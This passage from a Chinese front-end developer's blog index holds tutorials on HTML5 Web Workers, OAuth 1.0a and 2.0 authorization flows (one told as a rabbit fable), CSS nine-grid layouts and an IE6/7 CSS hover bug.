END.","tags":[{"name":"js","slug":"js","permalink":"/tags/js/"},{"name":"web","slug":"web","permalink":"/tags/web/"}]},{"title":"web worker简易入门","date":"2013-09-25T02:55:00.000Z","path":"2013/09/25/web-worker-learning/","text":"js是单线程的语言，由于此特性，我们在处理并发时需要用到一些技巧，如setTimeout()，setInterval()，调用XMLHttpRequest等。但这里的并发只是非阻塞（参照John Resig的文章How JavaScript Timers Work），真正的多线程编程则需要HTML5的web worker。 ###【worker的使用】web worker的使用非常简单，线程之间通讯的api与html5 postmessage或node.js里面的socket.io方法类似。 通讯： 发送方：postMessage(data) 接收方：onmessage(event) 终止web worker: 子线程: self.close() 父线程: worker.terminate() 按照目前w3c规范，web worker分为两种：专用worker(Dedicated Worker)和共享worker(Shared Worker)。 ###【专用worker】实例化一个web worker对象，异步加载子线程文件worker.js，其中的代码将执行。 var worker = new Worker(&quot;worker.js&quot;); 给worker增加侦听 worker.onmessage = function (event) { alert(event.data); }; 在worker.js里，发送消息给父线程 postMessage(&apos;hello，imweb&apos;); 在父线程页面就能看到发送过来的信息了。 同时，在web worker标准中，是支持对象参数的，也就是说我们能够传递json数据。再看一个稍微复杂点的例子，父线程： var worker = new Worker(&quot;worker.js&quot;); worker.onmessage = function (event) { document.getElementById(&quot;result&quot;).innerHTML=event.data; }; function start(){ worker.postMessage({&apos;cmd&apos;: &apos;start&apos;, &apos;msg&apos;: &apos;start&apos;}); } function pause(){ worker.postMessage({&apos;cmd&apos;: &apos;pause&apos;, &apos;msg&apos;: &apos;pause&apos;}); } function stop(){ worker.postMessage({&apos;cmd&apos;: &apos;stop&apos;, &apos;msg&apos;: &apos;stop&apos;}); } function msg(){ worker.postMessage({&apos;msg&apos;: &apos;hello imweb&apos;}); } worker.js： self.onmessage = function (e) { var data = e.data; switch (data.cmd) { case &apos;start&apos;: taskStart(); //大量数据处理 postMessage(&apos;WORKER DO: &apos; + data.msg); break; case &apos;pause&apos;: taskPause(); postMessage(&apos;WORKER DO: &apos; + data.msg); break; case &apos;stop&apos;: postMessage(&apos;WORKER DO: &apos; + data.msg); self.close(); //终止web worker break; default: postMessage(&apos;MESSAGE: &apos; + data.msg); }; }; 从上面的例子可以看到，一是利用对象参数，进程之间能够较灵活的实现控制；二是当woker执行taskStart()处理大量数据时，只在子进程处理，不会给主页面带来阻塞，通常，处理大量数据会消极影响程序的响应能力，而web worker通过这样的方式，能提供一个更流畅更实时的UI。 ###【共享worker】共享worker允许线程在同源中的多个页面间进行共享，例如：同源中所有页面或脚本可以与同一个共享线程通信。它的实例化与事件侦听的写法与专用worker略有不同,主页面： var worker = new SharedWorker(&apos;shared-worker.js&apos;); worker.port.onmessage = function(e) { msg = &apos;Someone just said &quot;&apos; + e.data.message + &apos;&quot;. That is message number &apos; + e.data.counter; console.log(msg); }; worker.port.postMessage(&apos;hello shared worker!&apos;); shared-worker.js: var counter = 0; var connections = []; onconnect = function(eConn) { var port = eConn.ports[0]; // 此连接的特有port //当有消息的时候通知所有的连接 port.onmessage = function(eMsg) { counter++; for (var i=0; i &lt; connections.length; i++) { connections[i].postMessage({ message: eMsg.data, counter: counter }); } } port.start(); connections.push(port); 用两个窗口打开这个页面，第一个显示：Someone just said “Hello shared worker!” This is message number 1，第二个也收到一样的信息，但是后面是message number 2。 ###【安全性和错误检查】出于安全性的考虑，web worker必须遵守同源策略。同时，它的全局对象是worker对象本身，this和self引用的都是worker对象。只能访问： navigator 对象（仅限appName, appVersion, platform, userAgent） location 对象（只读） XMLHttpRequest setTimeout(), setInterval(), clearTimeout()和clearInterval()方法 不能访问： DOM(不是线程安全的) window 对象 document 对象 parent 对象 worker内部出现错误时，可以用worker.onerror侦听到，error的事件有三个属性： filename: 发生错误的文件名 lineno: 代码行号 message: 完整的错误信息 如： worker.onerror = function(e) { console.log(e.filename+&quot;ERROR on line&quot;+e.lineno+&quot;,msg:&quot;+e.message); } ###【web worker的其他尝试】对于比较消耗时间的操作，我们可看到web worker能够发挥它的作用。比如：大量数据排序，精确到像素的canvas计算等。而我们又知道，jsonp加载数据时，动态创建script标签，加载和执行这些过程都是阻塞式的，而web worker正好可以异步加载，这会是更快的方式吗？带着这个疑问我做了下面的试验，分别用jsonp和worker的方式去加载文件，计算数据返回时延： function tryJsonp(){ var d = (new Date()).valueOf(); var jsonp=document.createElement(&quot;script&quot;); jsonp.type=&quot;text/javascript&quot;; jsonp.src=&quot;worker.js?_=&quot;+d; document.getElementsByTagName(&quot;head&quot;)[0].appendChild(jsonp); jsonp.onload = jsonp.onreadystatechange = function(){ if(!this.readyState||this.readyState==&apos;loaded&apos;||this.readyState==&apos;complete&apos;){ console.log(&apos;jsonp: &apos;+ ((new Date()).valueOf() - d)); } } } function tryWorker(){ var d = (new Date()).valueOf(); var worker = new Worker(&quot;worker.js&quot;); worker.postMessage({&apos;cmd&apos;: &apos;start&apos;, &apos;msg&apos;: &apos;start&apos;}); worker.onmessage = function (event) { console.log(&apos;web worker: &apos;+ ((new Date()).valueOf() - d)); }; } 第一次加载是一份1k大小的文件，每个方法重复5次，返回结果为:第二次加载1800k大小的文件，返回结果为：可以看到对于较小的数据，jsonp还是比web worker要快，这可能是实例化worker对象时带来的影响；而数据偏大时，web worker的加载将会更优，而且它可以异步加载。 THE END.","tags":[{"name":"html5","slug":"html5","permalink":"/tags/html5/"},{"name":"web","slug":"web","permalink":"/tags/web/"}]},{"title":"兔子，胡萝卜与OAuth的故事","date":"2013-08-20T04:55:00.000Z","path":"2013/08/20/oauth-rabbit/","text":"那些简单的故事，就别用复杂的方式传诵 ##【让我来讲几个故事吧】 从前，有只老兔子，在仓库里存了一万根胡萝卜，作为给小兔子的遗产。而后他就去周游世界了。小兔子有天想去把萝卜拿出来，却被仓库外的一只兔子拦住了。一问才知道，这是老兔子安排的仓库守卫。和所有故事中的守护者一样，他正直而古板，八字眉下面有着睡眠不足的熊猫眼，世人一般称他为兔门神。兔子想要拿到萝卜，就得说服兔门神呀，于是他走了上前… ##【兔子与OAuth1.0的故事】 兔子首先得证明自己是只兔子，不是狗熊也不是狼，于是他向兔门神出示了身份证 兔门神说：哦，你是只兔子。但你还得证明你是老兔子的兔崽子呀。兔子说我爸旅游去了，怎么证明呢？兔门神说，这样吧，我把你的身份证拍下来，发送给你爸，让他看下这是不是你。于是兔门神打开了微信…… 正在休假的老兔子看了下照片，回复说证件照好难看毁三观啊，但勉强认得出这货就是我儿子 兔门神确认这信息后，说，你老爸还是认你这个儿子的 兔子问，那我可以去拿胡萝卜了没？ 兔门神说，可以了，这样吧，我发你个通行证，以后拿这个来我就不用这么麻烦了。 ##【兔子与OAuth1.0a的故事】 这种貌似天衣无缝的形式，却被一只坏兔子看出了破绽。他注意到一个细节，在最后的一步，兔门神都是习惯性的把通行证交给了面前的兔子,而不管这只兔子是不是当初的那只。于是，坏兔子趁兔门神正在和老兔子聊微信的时候，一个劲站在了兔子前面，最后兔门神居然把通行证塞给了他！这怎么可以？于是在第一步和第六步又有了修改。 兔子出示身份证的同时，也出示了自己的私房照，说，门神大哥呀，后面你记得把通行证给照片上的帅哥！ …… …… …… …… 兔门神看了下面前的兔子，私房照上的明显P过嘛但勉强认得出是本人，于是才交出了通行证 ##【兔子与Oauth2.0的故事】 兔门神回家后，向他的老婆兔女神汇报了今天的工作，更安全的方案使他得意洋洋，没想到被兔女神骂了一顿。兔女神说，兔子证明自己还得带个身份证，你不知道在天朝办个身份证多麻烦吗？让小兔子跟老兔子去聊下微信就可以了干嘛要你插手？兔门神哑口无言，兔女神高贵冷艳的说我有四种方案，给你先说说最常用的一种吧。 兔子一开始就跟他老爸聊微信了。当然他得明确告诉老爸，他需要打开哪个仓库（因为老兔子有很多儿子，每个儿子去拿萝卜的仓库不一样，兔子要指定一下具体是哪个，问他可不可以） 老兔子回复说：“just do IT”… 兔子然后去拿胡萝卜，首先被兔女神拦住了。女神告诉他，你要给我四样东西：老兔子的回复，你的私房照，身份证，还要给我一个密码。兔子愣愣的想了个密码，把这四样东西交了过去 兔女神把这四种东西混在一起，用魔法变出了两件法宝：一封情书和一撮猴子毛…然后她解释说：拿着我的情书去找我老公，他就让你进仓库了；但是这情书会过期，是出于安全考虑啦，过期后你得召唤我再写一封，召唤出我的步骤就是吹一下猴子毛，像孙悟空那样你就别在意这些细节好伐？ 兔子拿着情书去找兔门神时，发现他由于被妻子分担了压力，明显睡眠好多了… ##【演员表】 兔子-消费者，也就是第三方应用老兔子-用户，也就是我们，记住，我们永远是第三方的亲爹仓库-Oauth提供者，这里有我们保存的资料，比如说新浪微博，qq空间，人人…兔门神-在前两个故事中，由授权服务器和资源服务器共同扮演，在最后的故事中，只由资源服务器扮演兔女神-授权服务器，只管授权，不管取资源 ##【重要道具】 身份证-签名，将一个http请求以及相应参数字符串化拍下的身份证照片-Request Token，服务器进行认证通行证-Access Token，获取资源的凭证私房照-重定向地址坏兔子(我把它当成道具而不是演员)-重定向地址劫持仓库的名称-appId,即对应具体哪个第三方just do it-Auth code，用户授权号第三个故事的身份证-client id 客户端帐号密码-client secret 客户端密码魔法-将client id，client secket，重定向地址，Auth code生成Access Token情书-Access Token，获取资源的凭证猴子毛-Refresh Token，用来在Access Token过期后将其刷新，刷新需带上client id和client secret ##【说书人说】 Oauth2.0比起Oauth1.0，没有了第一步的签名，将服务器分开为授权服务器与资源服务器。这是最大的两个特征。开放平台必须得做到对第三方友好，才有利于接入。像Oauth1.0签名的操作，就难倒了许多第三方。也许你知道了Oauth2.0接入步骤简化了些，但也知道其内部实现要更复杂，抛去安全方面的考虑，我认为这是正确的方向。因为，Oauth2.0在某种意义上说，向第三方做到了——“把悲伤留给自己，你的美丽让你带走”。","tags":[{"name":"web","slug":"web","permalink":"/tags/web/"}]},{"title":"谈谈OAuth1,OAuth2异同","date":"2013-08-11T02:55:00.000Z","path":"2013/08/11/brief-oauth/","text":"##一、写在前面在收集资料时，我查询和学习了许多介绍OAuth的文章，这些文章有好有坏，但大多是从个例出发。因此我想从官方文档出发，结合在stackoverflow上的一些讨论，一并整理一下。整理的内容分为OAuth1.0a和OAuth2两部分。 OAuth 1.0a：One Leg -&gt;Two Leg -&gt; Three LeggedOAuth 2:Two Leg -&gt;Three Legged (附：Refresh Token的方式) 这两种模式都是按箭头从左往右安全性递增，其实现也会相对复杂。关于官方的这种leg（腿？）的说法，在中文翻译中比较少有文章提及。下面分别来介绍OAuth的这5种授权流程。 ##二、OAuth1.0a2.1 OAuth 1.0a (One Leg) 应用给服务器发送一个签名请求，附带以下参数： oauth_token Empty String oauth_consumer_key oauth_timestamp oauth_nonce oauth_signature oauth_signature_method oauth_version Optional 服务验证并授予对资源的访问 应用程序利用请求的资源 2.2 OAuth 1.0a (Two Legs) 应用发送一个签名请求，以获取 Request Token： oauth_consumer_key oauth_timestamp oauth_nonce oauth_signature oauth_signature_method oauth_version Optional 服务器返回Request Token： oauth_token oauth_token_secret Additional Parameters / Arguments 发送签名请求，用Request Token换取Access Token oauth_token Request Token oauth_consumer_key oauth_nonce oauth_signature oauth_signature_method oauth_version 服务器返回Access Token和Token Secret 应用通过Access Token和Token Secret利用请求的资源 2.3 OAuth 1.0a (Three Legged) 应用发送一个签名请求，以获取 Request Token： oauth_consumer_key oauth_timestamp oauth_nonce oauth_signature oauth_signature_method oauth_version Optional 服务器返回Request Token： oauth_token oauth_token_secret oauth_callback_confirmed … Additional Parameters / Arguments 发送给用户授权的URL oauth_token 提示用户进行授权 用户进行授权 授权结束后返回应用，附带上： oauth_token oauth_verifier 发送签名请求，用Request Token换取Access Token oauth_token Request Token oauth_consumer_key oauth_nonce oauth_signature oauth_signature_method oauth_version oauth_verifier 服务器返回Access Token和Token Secret 应用通过Access Token和Token Secret利用请求的资源 ##三、OAuth2 3.1 OAuth 2 (Two Legged) 3.1.1 客户端凭据方式 应用发送请求到服务器： grant_type = client_credentials如果没有使用Authorization（Authorization: Basic Base64(client_id:client_secret)） 的header，必须附带参数为： client_id client_secret 服务器以Access Token回应 access_token expires_in token_type 3.1.2 隐式授予方式 应用发送请求到服务器： response_type = token redirect_uri This is a server-side Redirection URI hosted by the provider or yourself. scope state Optional client_id 用户可根据需要授权。 username password 服务器将响应包含access_token在内的redirect_uri 应用程序跳转至redirect_uri redirect_uri将响应一段脚本或HTML片段。响应的脚本或HTML片段包含参数access_token，还有您可能需要的任何其他参数。 3.1.3 资源所有者密码方式 应用向资源所有者请求凭证 username password 应用使用凭证，向服务器发送请求 grant_type = password username passwordurl看起来会像这样：grant_type=password&amp;username=my_username&amp;password=my_password如果你没有使用Authorization的header，必须附带上参数： client_id client_secreturl看起来会像是：grant_type=password&amp;username=my_username&amp;password=my_password&amp;client_id=random_string&amp;client_secret=random_secret 服务器返回Access Toke access_token expires_in token_type 3.2 OAuth 2 (Three Legged) 应用重定向用户到授权服务： client_id redirect_uri response_type state Optional; Unique identifier to protect against CSRF scope Optional; what data your application can access.url看起来会像是：oauth_service/login/oauth/authorize?client_id=3MVG9lKcPoNINVB&amp;redirect_uri=http://localhost/oauth/code_callback&amp;scope=user 用户登录服务器并确认授权给应用 服务器重定向用户到redirect_url ，附带参数： code state 应用拿到code，并换取Access Token client_id client_secret code redirect_uri Optional; grant_type = “authorization_code” 如果的client_id和client_secret是有效的，服务器将调用一个回调redirect_url，包含ACCESS_TOKEN access_token expires_in refresh_token 应用保存ACCESS_TOKEN，在随后的请求中使用。通常这个值被存储在session或或cookie，需要时作为授权请求的参数。 3.3 OAuth 2 (Refresh Token 刷新token) 在OAuth2中，Token会有过期时间，我们必须去refresh_token，使用其他一些先前获得的参数，生成一个新的token。这是一个容易得多的流程。 创建刷新令牌请求 grant_type = “refresh_token” scope Optional; Cannot have any new scopes not previously defined. refresh_token client_id client_secret 服务验证和响应以下参数： access_token issued_at ##四、stackoverflow上的一些问答 Q：OpenID和OAuth的区别是什么？A：OpenID是有关身份验证（即证明你是谁），OAuth有关授权（即授予访问权限），推荐博文：从用户的角度来看OpenID和OAuth Q：OAuth2与OAuth1不同的地方是？有人可以简单的解释的OAuth2和OAuth1之间的区别吗？ OAuth1现在已经过时，应实施的OAuth2？我没有看到许多实现的OAuth2，大多数仍在使用OAuth，这让我怀疑的OAuth2的准备使用。是吗？A：OAuth2能更好地支持不是基于浏览器的应用。对于不是基于浏览器的应用程序，这是对OAuth的主要挑战。例如，在OAuth1.0，桌面应用或手机应用必须引导用户打开浏览器所需的服务，与服务进行身份验证，并复制令牌从服务返回给应用程序。这里的主要批评是针对用户体验。使用OAuth2.0，可以用新的方式为用户的应用程序获得授权。OAuth2.0不再需要客户端应用程序拥有密钥。这让人回想起老的Twitter认证的API，它并不需要应用得到HMAC哈希令牌和请求字符串。使用OAuth2.0，应用程序可以通过HTTPS获得令牌。OAuth2.0的签名流程简单得多。没有更多的特殊解析，排序，或编码。OAuth2.0的访问令牌是“短命”的。通常情况下，OAuth1.0的访问令牌可以存储一年或一年以上（Twitter从来没有让他们到期）。 OAuth的2.0有刷新令牌的概念。虽然我不能完全肯定这是什么意思，我的猜测是，您的访问令牌可以是短暂存储的（即基于会话），而你可以刷新令牌。你使用刷新令牌获取新的访问令牌，而不是让用户重新授权您的应用程序。最后，OAuth2.0使得负责处理的OAuth请求的服务器和处理用户的授权服务器之间的角色有一个干净的分离。更多信息，在上述的文章中详述。 Q：OAuth2服务器群怎么使用state来防范CSRF？A：state只是一个随机的字符串，可以做这样的事情：$state = md5(uniqid(rand(), TRUE));在session中记录satate，以便稍后你能做验证。一些额外的资料：OAuth2威胁文件模型，特别CSRF保护","tags":[{"name":"web","slug":"web","permalink":"/tags/web/"}]},{"title":"css实现九宫格(二)","date":"2012-12-21T05:54:00.000Z","path":"2012/12/21/css-jiugongge2/","text":"书接上回，上回在这。 9个元素，每个50*50px，排成九宫格默认是border颜色为blue，hover到格子上变成red（兼容到IE6） 题目的关键是解决“公用边”，上次我主要做了两个方面的尝试： 用负margin使元素的border叠加用table的border-collapse实现边框合并 这一次的思路则更加简明，也是个人认为是更好的方法。感谢队长提供的思路。 ##能不能不用border？如果不用border，怎么实现hover后，格子四周变红呢？那肯定是两个dom嵌套在一起，一大一小，小的dom作为“格子”，大的dom作为格子的红色“边框”。先看我初始化的一个格子设定：html：123&lt;div id=\"test\"&gt; &lt;a href=\"#\"&gt;&lt;div&gt;1&lt;/div&gt;&lt;/a&gt;&lt;/div&gt; 初始css:12345678910111213141516171819202122232425262728293031323334353637383940414243 #test div&#123; width: 50px; line-height: 50px; text-align:center; background: #AAA; &#125; #test a&#123; width: 55px; line-height: 55px; float: left; &#125; #test a:hover&#123; background: red; &#125;```css由于a标签设置了宽度为55px，div标签设置了宽度为50px，这时候格子hover看起来只露出了**右边**的5px红色部分。 接下来，div添加属性&lt;code&gt;margin-top:5px;margin-right:5px&lt;/code&gt;，这时可以显示**上部**的5px边框。再接着，在div的容器，也就是a标签设置&lt;code&gt;padding-left:5px;padding-bottom:5px;&lt;/code&gt;，使格子**左边框**和**下边框**都显示出来。![完成一个格子的设置步骤](/assets/blogImg/jiugongge8.jpg) 那么为什么要将a标签设置为55px，再进行一系列关于margin和padding的设置呢，原因我们最后再说。因此修改后的css为：```css #test div&#123; width: 50px; line-height: 50px; text-align:center; background: #AAA; margin-right:5px; margin-top:5px; &#125; #test a&#123; width: 55px; line-height: 55px; float: left; margin-right: -5px; margin-bottom: -5px; &#125; #test a:hover&#123; background: red; &#125; ##九个格子会怎样？将a标签左浮动，同时添加到九个格子，这时候的效果是：两个格子之间会有10px的距离。 为解决“公用边”问题，在a标签添加负值的margin：margin-right:-5px;margin-bottom:-5px;。最后将最外层的容器#test的宽度和高度设置为170px(503+54)，背景设置为蓝色。这时候大功告成了。 最终的代码是：html：1234567891011&lt;div id=\"test\"&gt; &lt;a href=\"\"&gt;&lt;div&gt;1&lt;/div&gt;&lt;/a&gt; &lt;a href=\"\"&gt;&lt;div&gt;2&lt;/div&gt;&lt;/a&gt; &lt;a href=\"\"&gt;&lt;div&gt;3&lt;/div&gt;&lt;/a&gt; &lt;a href=\"\"&gt;&lt;div&gt;4&lt;/div&gt;&lt;/a&gt; &lt;a href=\"\"&gt;&lt;div&gt;5&lt;/div&gt;&lt;/a&gt; &lt;a href=\"\"&gt;&lt;div&gt;6&lt;/div&gt;&lt;/a&gt; &lt;a href=\"\"&gt;&lt;div&gt;7&lt;/div&gt;&lt;/a&gt; &lt;a href=\"\"&gt;&lt;div&gt;8&lt;/div&gt;&lt;/a&gt; &lt;a href=\"\"&gt;&lt;div&gt;9&lt;/div&gt;&lt;/a&gt;&lt;/div&gt; css：123456789101112131415161718192021222324252627#test&#123; width: 170px; height:170px; background: blue; margin: 0 auto;&#125;#test div&#123; width: 50px; line-height: 50px; text-align:center; background: #AAA; margin-right:5px;/*这句不要也可以*/ margin-top:5px;&#125;#test a&#123; width: 55px; line-height: 55px; float: left; text-decoration: none; padding-left: 5px; padding-bottom: 5px; margin-right: -5px; margin-bottom: -5px;&#125;#test a:hover&#123; background: red;&#125; ##巧妙在哪里？ a标签hover前不设置背景色，露出最外层#test的蓝色背景，看起来格子有蓝色的边框；a标签hover时背景色设置为红色，充当了格子的红色边框； a标签设置为55px是最关键的一点。按照此思路和题目要求，格子是50px大小，边框的dom应该是60px大小。而此时a设置为55px，因为a要设置padding-left:5px;padding-bottom:5px;，刚好a就有60px大小了；而a里面的div要设置margin-top:5px;margin-right:5px（其实margin-right也可以不加）,这时候margin和padding就达到了一个“中和”的效果，使布局不发生偏差。 点此看demo。","tags":[{"name":"css","slug":"css","permalink":"/tags/css/"}]},{"title":"分享一个IE6，7的CSS hack bug","date":"2012-12-17T11:43:00.000Z","path":"2012/12/17/share-a-css-hack/","text":"###一、分享一个IE6，7的css hack bug。 IE和我们之间，肯定有一个是傻逼，如果它不是，那我们准是。不然很多事情没法解释… ——多么痛的领悟 先看代码，或者点击看demohtml:1234&lt;div id=\"main\"&gt; &lt;div class=\"box\"&gt;&lt;/div&gt; &lt;div class=\"box\"&gt;&lt;/div&gt;&lt;/div&gt; css:12345678910111213141516171819#main&#123; width: 200px; height: 50px; border: 1px solid #000; margin: 0 auto;&#125;#main .box&#123; width: 50px; height: 50px; margin-left: 10px; position: relative; float: left; background: #333;&#125;#main .box:hover&#123; z-index: 999; /*background: #333;*/ /*background: #999;*/&#125; .box设置了的四行核心代码是： float:left - 左浮动 margin-left: 10px - 左外边距为10px position: relative - 因为在box里面想用一个dom做绝对定位 background: #333 - 设置background颜色为#333当.box触发hover时，做了一步z-index的改变，这时候在IE6，7中出现bug：因margin-left失效，.box会向左移动10px；而且这时候设置margin-left是不起作用的，hover结束后.box也不会回到原来的位置。 ###二、淡定解决异次元的bug 诡异的事情最后水落石出：background属性居然影响了margin。 将.box:hover多加一行background属性，比如：background: #999，这样子在IE上“看上去”就解决了。但是，就当你以为解决了bug的时候，如果.box:hover的background颜色设置与hover之前的颜色一样，也就是设置为background: #333，阴魂不散的bug又会重新出现啦。 庆幸你的需求是background颜色不一样吧。如果还真是悲剧到要做成一样的颜色，解决的办法恐怕只能是取消.box的position: relative，然后多加一层dom容器了。1234&lt;div class=\"box\"&gt; &lt;div style=\"position: relative\"&gt;…&lt;/div&gt; …&lt;/div&gt; 友情link：xueran的这篇文字。","tags":[{"name":"css","slug":"css","permalink":"/tags/css/"}]},{"title":"css实现九宫格(一)","date":"2012-12-14T11:15:00.000Z","path":"2012/12/14/css-jiugongge/","text":"前段时间，我的 leader Henry在群里面分享了一道一淘的面试题。 题目非常的有趣，忙完前阵的工作之后突然记起，也尝试做了一下。 9个元素，每个50*50px，排成九宫格默认是border颜色为blue，hover到格子上变成red（兼容到IE6） 做成九宫格大家都会，但题目的陷阱就在hover上。鼠标hover到格子4，格子5时，其实他们“共用”了一条边。由于是纯css实现的，我们不可能说用js去动态改变dom，因此怎样实现“公用边”就成为了难点。 尝试的过程： 我的第一个想法，用“叠加”的方式实现“公用边”； 后来的想法，用table的border-collapse实现“公用边”； 在table想法的基础上改进； 一种更简便的做法，不需要border，见九宫格(二) ##我的第一个想法 先做做看，尝试永远是第一步。我将9个div都设置了5px的border，排成了九宫格，添加了hover，这时候初始的效果是：这样其实格子之间的距离是两倍border（10px）。需要再将中间的一竖（2，5，8）设置margin-left:-5px;margin-right:-5px;,再将中间的一横（3，4，5）设置margin-top:-5px;margin-bottom:-5px;，这样等于是强制把格子间的距离“拉”到5px。到这一步，简单的九宫格是完成了，但hover之后会发现，格子的边会被挡住（格子5的下边和右边分别被格子8和格子6挡住）。因为这里“公用边”的思路准确来说是“重合边”，是用负值的margin强制定位的。而我的解决方式是hover时添加z-index:999，让hover到的格子在最上层显示而不会被挡住。同时，不要忘记在9个div的css里面添加一句让z-index生效的position: relative;，具体原因看这里。 代码君：1.html：1234567891011&lt;div id=\"test0\"&gt; &lt;div&gt;1&lt;/div&gt; &lt;div class=\"lr_indent\"&gt;2&lt;/div&gt; &lt;div&gt;3&lt;/div&gt; &lt;div class=\"tb_indent\"&gt;4&lt;/div&gt; &lt;div class=\"lr_indent tb_indent\"&gt;5&lt;/div&gt; &lt;div class=\"tb_indent\"&gt;6&lt;/div&gt; &lt;div&gt;7&lt;/div&gt; &lt;div class=\"lr_indent\"&gt;8&lt;/div&gt; &lt;div&gt;9&lt;/div&gt;&lt;/div&gt; 2.css:1234567891011121314151617181920212223242526272829#test0&#123; margin: 30px; width: 200px; height: 200px;&#125;#test0 div&#123; width: 50px; height: 50px; float: left; background: #eee; border: 5px solid #00f; text-align: center; line-height: 50px; color: #090; position: relative;&#125;#test0 .lr_indent&#123; margin-left: -5px; margin-right: -5px;&#125;#test0 .tb_indent&#123; margin-top: -5px; margin-bottom: -5px;&#125;#test0 div:hover&#123; border: 5px solid #f00; z-index: 999; background: #eee;/*必须加这一句，在IE6，7有bug*/&#125; 思考：这样的方式好吗？不够好。这才是9宫格，如果是16，25，…，81个格子，设置margin缩进的人力代价是很高的。兼容性，在IE6，7下，负值margin在hover时候有bug。 ##后来的想法 经过第一次尝试，我得到一个经验：要用一种通用的方法去解决“公用边”，而不是分别设置.lr_indent和.tb_indent。随即我想到了表格。作为table，它有个很突出的属性，就是合并border，css里面的设置为border-collapse:collapse;。ok，这就是key point。 按照这个思路，我简单的编写了代码，一开始我把hover定位到td上面去，发现hover时也会出现第一个想法中“挡住”的情况。而且，去将td的position改变，再添加z-index的方法是不可能有用的(z-index不会起效)。 我的方法是在td中包含一个span，把hover定位到span中去，td设置为position:relative;，span设置为position:absolute;，这时候的hover就可以设置让span的border不被挡住展示了。代码君又来了：html：12345678910111213141516171819&lt;div id=\"test1\"&gt; &lt;table&gt; &lt;tr&gt; &lt;td&gt;&lt;span&gt;1&lt;/span&gt;&lt;/td&gt; &lt;td&gt;&lt;span&gt;2&lt;/span&gt;&lt;/td&gt; &lt;td&gt;&lt;span&gt;3&lt;/span&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;&lt;span&gt;4&lt;/span&gt;&lt;/td&gt; &lt;td&gt;&lt;span&gt;5&lt;/span&gt;&lt;/td&gt; &lt;td&gt;&lt;span&gt;6&lt;/span&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;&lt;span&gt;7&lt;/span&gt;&lt;/td&gt; &lt;td&gt;&lt;span&gt;8&lt;/span&gt;&lt;/td&gt; &lt;td&gt;&lt;span&gt;9&lt;/span&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt;&lt;/div&gt; css：123456789101112131415161718192021222324252627282930*&#123; margin:0; padding: 0;&#125;table&#123; border-collapse: collapse;&#125;#test1 td&#123; width: 50px; height: 50px; background: #eee; position: relative; border: 5px solid #00f; text-align: center;&#125;#test1 td span&#123; color: #090; display:block; width: 50px; height: 50px; position: absolute; top: 0; left: 0; line-height: 50px;&#125;#test1 td span:hover&#123; border: 5px solid #f00; margin-top:-5px; margin-left: -5px;&#125; 别忘了span在hover时，必须设置一个负的margein-top和margein-left，以保证红色边框恰好定位在格子四周。见css君最后的片段。假如不设置，你看到的将是这样：本以为已经大功告成了，在IE中测试却让我傻了眼：（ps：作为前端一枚，我已经做好了妥妥的心理准备，但此情此景还是让人喷出一口老血……） ##改进，改进 说实话，table和div之争这么多年，大家都在页面中用越来越多的div，而越发的鄙视table，反而对table的熟悉程度反应了前端们的基础是否扎实。吃一堑长一智，这句话特别适用于在table中翻江倒海的亲们。 改进！ 首先这个bug（也无所谓是不是bug，算是浏览器的差异性吧）我知道，在table的td里面设置了position:relative;就会在IE中出现这样的情况。注意是所有的IE哦，包括IE10。而根据第二个思路，最后的hover定位的元素为span，它本身设定为position:absolute;它的父级元素必须得设置position:relative;才能完成题目功能，这是毋庸置疑的。 既然现在span的父级td不能设置position:relative;，我就在它们之间添加一个div，用来做span的容器。 代码君再一次来了：html:12345678910111213141516171819&lt;div id=\"test2\"&gt; &lt;table&gt; &lt;tr&gt; &lt;td&gt;&lt;div&gt;&lt;span&gt;1&lt;/span&gt;&lt;/div&gt;&lt;/td&gt; &lt;td&gt;&lt;div&gt;&lt;span&gt;2&lt;/span&gt;&lt;/div&gt;&lt;/td&gt; &lt;td&gt;&lt;div&gt;&lt;span&gt;3&lt;/span&gt;&lt;/div&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;&lt;div&gt;&lt;span&gt;4&lt;/span&gt;&lt;/div&gt;&lt;/td&gt; &lt;td&gt;&lt;div&gt;&lt;span&gt;5&lt;/span&gt;&lt;/div&gt;&lt;/td&gt; &lt;td&gt;&lt;div&gt;&lt;span&gt;6&lt;/span&gt;&lt;/div&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;&lt;div&gt;&lt;span&gt;7&lt;/span&gt;&lt;/div&gt;&lt;/td&gt; &lt;td&gt;&lt;div&gt;&lt;span&gt;8&lt;/span&gt;&lt;/div&gt;&lt;/td&gt; &lt;td&gt;&lt;div&gt;&lt;span&gt;9&lt;/span&gt;&lt;/div&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt;&lt;/div&gt; css:1234567891011121314151617181920212223242526272829303132333435*&#123; margin:0; padding: 0;&#125;table&#123; border-collapse: collapse;&#125;#test2 td&#123; width: 50px; height: 50px; background: #eee; border: 5px solid #00f; text-align: center; vertical-align: top;&#125;#test2 td div&#123; position:relative; width: 50px; height: 50px;&#125;#test2 td div span&#123; color: #090; display:block; width: 50px; height: 50px; position: absolute; top: 0; left: 0; line-height: 50px;&#125;#test2 td div span:hover&#123; border: 5px solid #f00; margin-left: -5px; margin-top: -5px;&#125; OK，效果达成！可以猛点这里看看demo。 最后吐槽，不对，总结一下下： 先到IE上去测，再转到其它浏览器，以少走弯路，这叫擒贼先擒王-_-!；win8的metro布局最近挺流行的，有时候table比div好用；IE君，你真是……此处省略1024个字 这个系列打算写两篇文章，下一篇介绍另外一种更简洁的方法。:)","tags":[{"name":"css","slug":"css","permalink":"/tags/css/"}]}]